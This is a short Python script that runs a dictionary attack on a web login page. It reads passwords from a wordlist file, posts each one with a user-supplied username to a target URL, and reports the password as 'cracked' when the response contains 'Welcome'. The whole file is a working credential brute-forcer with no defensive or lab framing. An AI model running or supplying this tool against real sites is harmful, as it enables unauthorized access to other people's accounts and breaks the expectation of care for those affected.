import requests

dictfile =open('dict.txt','r').readlines()
username=raw_input("Enter username:")
web_page=raw_input("Enter url of web page")
for pas in dictfile:
    password=pas.strip()
    login_info={
        'name': username,
        'pass': password,
    }
    with requests.Session() as s:
        url=web_page
        page=s.post(url, data=login_info)
        content=page.content
        if "Welcome" in content:
            print("Password cracked successfully : {}".format(password))
            break
        else:
            print("login Unsuccessfull with password : {}".format(password))
